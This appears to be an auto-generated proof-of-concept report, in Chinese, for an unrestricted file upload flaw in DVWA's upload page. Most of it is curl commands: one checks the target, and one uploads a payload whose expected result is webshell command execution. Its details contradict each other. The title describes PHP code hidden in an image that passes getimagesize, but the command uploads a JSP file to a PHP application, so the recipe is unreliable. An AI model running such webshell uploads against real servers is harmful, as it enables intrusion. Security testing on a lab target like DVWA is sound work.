# POC — DVWA 文件上传页面 043.php 仅校验扩展名与 getimagesize，可上传含 PHP 代码的图片并写入 web 可访问目录

- finding_id: `LLM-7a70487f2fb0`
- type: `file_upload` / CWE-434
- severity: `high`
- file: `043.php:27`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/vulnerabilities/upload/'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 不安全文件上传 载荷**  
```http
curl -sS -i -X POST 'http://TARGET:8080/vulnerabilities/upload/' \
  -F 'Upload=Upload' \
  -F 'uploaded=@sunset.jsp;filename=sunset.jsp'
```
预期：上传文件可访问/解析，返回 webshell 执行结果。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。